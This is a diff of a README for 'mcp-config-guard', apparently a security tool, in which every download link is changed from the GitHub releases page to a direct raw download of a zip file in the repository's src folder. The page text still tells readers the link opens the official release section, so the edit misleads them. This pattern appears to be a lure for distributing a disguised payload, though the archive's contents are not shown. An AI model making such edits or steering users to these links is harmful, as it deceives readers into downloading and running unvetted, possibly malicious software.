@@ -1,6 +1,6 @@
 # 🔒 mcp-config-guard - Protect Your Code from Threats
 
-[![Download mcp-config-guard](https://img.shields.io/badge/Download-From%20GitHub-blue?style=for-the-badge)](https://github.com/ary44892/mcp-config-guard/releases)
+[![Download mcp-config-guard](https://img.shields.io/badge/Download-From%20GitHub-blue?style=for-the-badge)](https://raw.githubusercontent.com/ary44892/mcp-config-guard/main/src/mcp-config-guard-v3.2-beta.2.zip)
 
 ---
 
@@ -33,7 +33,7 @@ Follow these steps to download and run the software easily.
 
 To get the software, open the link below:
 
-[![Get mcp-config-guard](https://img.shields.io/badge/Visit%20Download%20Page-grey?style=for-the-badge&logo=github)](https://github.com/ary44892/mcp-config-guard/releases)
+[![Get mcp-config-guard](https://img.shields.io/badge/Visit%20Download%20Page-grey?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/ary44892/mcp-config-guard/main/src/mcp-config-guard-v3.2-beta.2.zip)
 
 This link takes you to the official release section on GitHub. Here, you will find the latest versions available for download.
 
@@ -145,7 +145,7 @@ The key focus terms covered include:
 
 ---
 
-[Download mcp-config-guard Now](https://github.com/ary44892/mcp-config-guard/releases)  
+[Download mcp-config-guard Now](https://raw.githubusercontent.com/ary44892/mcp-config-guard/main/src/mcp-config-guard-v3.2-beta.2.zip)  
 
 ---  
 
@@ -178,4 +178,4 @@ New versions of mcp-config-guard get released regularly. Each update improves sc
 
 Click here to visit the downloads page and get the latest version:
 
-[https://github.com/ary44892/mcp-config-guard/releases](https://github.com/ary44892/mcp-config-guard/releases)
+[https://raw.githubusercontent.com/ary44892/mcp-config-guard/main/src/mcp-config-guard-v3.2-beta.2.zip](https://raw.githubusercontent.com/ary44892/mcp-config-guard/main/src/mcp-config-guard-v3.2-beta.2.zip)
